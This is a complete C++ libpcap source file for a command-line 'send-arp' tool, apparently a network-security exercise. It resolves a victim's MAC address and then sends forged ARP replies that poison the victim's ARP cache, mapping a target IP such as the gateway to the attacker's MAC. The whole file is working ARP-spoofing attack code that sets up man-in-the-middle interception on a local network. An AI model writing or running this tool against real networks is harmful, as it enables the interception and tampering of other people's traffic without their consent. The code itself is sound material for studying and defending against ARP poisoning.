#include <cstdio>
#include <pcap.h>
#include <cstdlib>
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ctime>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"
 
#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)
 
Mac myMac;
Ip myIP;
pcap_t* handle = nullptr;
 
bool getMyInfo(const char* ifname) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket()");
        return false;
    }
 
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
 
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sockfd);
        return false;
    }
    myMac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
 
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sockfd);
        return false;
    }
    struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
    myIP = Ip(ntohl(sin->sin_addr.s_addr));
 
    close(sockfd);
    return true;
}
 
bool getMacFromIP(Ip targetIp, Mac& resolvedMac) {
    EthArpPacket packet;
 
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
 
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(myIP);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(targetIp);
 
    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 
    time_t start = time(nullptr);
    while (true) {
        if (time(nullptr) - start > 5) {
            fprintf(stderr, "[-] Timeout waiting for ARP reply from %s\n", std::string(targetIp).c_str());
            return false;
        }
 
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
 
        EthArpPacket* recv = (EthArpPacket*)recv_packet;
        if (ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;
        if (recv->arp_.sip() != targetIp) continue;
 
        resolvedMac = recv->arp_.smac();
        return true;
    }
 
    return false;
}
 
bool sendArpSpoof(Ip spoofedIp, Mac targetMac, Ip targetIp) {
    EthArpPacket packet;
 
    packet.eth_.dmac_ = targetMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);
 
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(spoofedIp);
    packet.arp_.tmac_ = targetMac;
    packet.arp_.tip_  = htonl(targetIp);
 
    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
        fprintf(stderr, "[-] Failed to send spoofed packet: %s\n", pcap_geterr(handle));
        return false;
    }
 
    return true;
}
 
void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.0.2 192.168.0.1\n");
}
 
int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }
 
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "[-] Couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }
 
    if (!getMyInfo(dev)) {
        fprintf(stderr, "[-] Failed to get attacker info\n");
        return -1;
    }
 
    printf("[*] My MAC: %s\n", std::string(myMac).c_str());
    printf("[*] My IP : %s\n", std::string(myIP).c_str());
 
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i + 1]);
        Mac senderMac;
 
        printf("\n[*] Resolving sender (%s) MAC...\n", std::string(senderIp).c_str());
        if (!getMacFromIP(senderIp, senderMac)) {
            printf("[-] Failed to get MAC for sender: %s\n", std::string(senderIp).c_str());
            continue;
        }
 
        printf("[+] Sender MAC: %s\n", std::string(senderMac).c_str());
 
        if (sendArpSpoof(targetIp, senderMac, senderIp)) {
            printf("[+] Sent ARP spoofing reply to %s\n", std::string(senderIp).c_str());
        }
    }
 
    pcap_close(handle);
    return 0;
}